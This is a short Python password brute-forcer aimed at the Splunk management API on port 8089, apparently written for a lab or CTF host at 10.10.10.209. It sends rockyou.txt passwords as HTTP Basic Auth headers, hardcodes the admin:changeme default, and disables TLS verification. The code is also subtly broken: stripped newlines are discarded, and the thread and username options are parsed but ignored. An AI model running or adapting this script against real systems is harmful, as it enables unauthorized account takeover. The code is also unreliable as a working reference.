import requests
import argparse
import base64

URL = 'https://10.10.10.209:8089/services'
USERNAME = 'admin'
DEFAULT_PASS = 'changeme'
WORDLIST = '/usr/share/wordlists/rockyou.txt'
THREADS = 20

baseCreds = 'YWRtaW46Y2hhbmdlbWU=' # Combination of user:pass in base64
head = {'Authorization': f'Basic {baseCreds}'}

# Disable SSL warnings (Splunk often uses self-signed certs)
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# encode creds to base64 (since splunkd take them like that)
def generate_creds(password):
    join_creds = f'{USERNAME}:{password}'
    try:
        join_creds_bytes = join_creds.encode('ascii')
    except UnicodeEncodeError:
        # fallback to utf-8 so non-ascii passwords won't crash the script
        join_creds_bytes = join_creds.encode('utf-8')

    encoded_creds_bytes = base64.b64encode(join_creds_bytes)
    encoded_creds = encoded_creds_bytes.decode('ascii')

    return {'Authorization': f'Basic {encoded_creds}'}

def main():
    global head # Make head variable global, so it can be modified
    parser = argparse.ArgumentParser(description='Multi-threaded Splunk 8089 brute-forcer')
    parser.add_argument('-u', '--username', required=False, default=USERNAME, help='Username to brute force')
    parser.add_argument('-w', '--wordlist', required=False, default=WORDLIST, help='Password wordlist path')
    parser.add_argument('-t', '--threads', type=int, default=THREADS, help='Number of threads')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-U', '--url', default=URL, help='Target Splunk 8089 URL')
    args = parser.parse_args()

    print(f'[+] Starting brute force against {args.url} as user "{args.username}"')

    # Opens a file in read mode with latin encoding (useful if there's weird chars)
    with open(args.wordlist, "r", encoding="latin-1") as file_obj:
        # Iterate directly over the file (no readline) to save memory
        for pwd in file_obj:
            pwd.strip() # Remove the newline
            head = generate_creds(pwd)
            if args.debug:
                print(head)
            try:
                req = requests.get(args.url, headers=head, verify=False, timeout=5)
                if args.verbose:
                    print(f'response code is {req.status_code} and body is \n "{req.text}"')
                if req.status_code == 200:
                    print(f'[+] SUCCESS! Found valid password = {pwd}') # DISCALIMER: password is on base64
                    exit(0)
            except requests.RequestException as e:
                    print(f"Request error: {e}")  
        print("[-] No valid credentials found in wordlist")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Keyboard Interruption. Exiting...")
        exit(0)
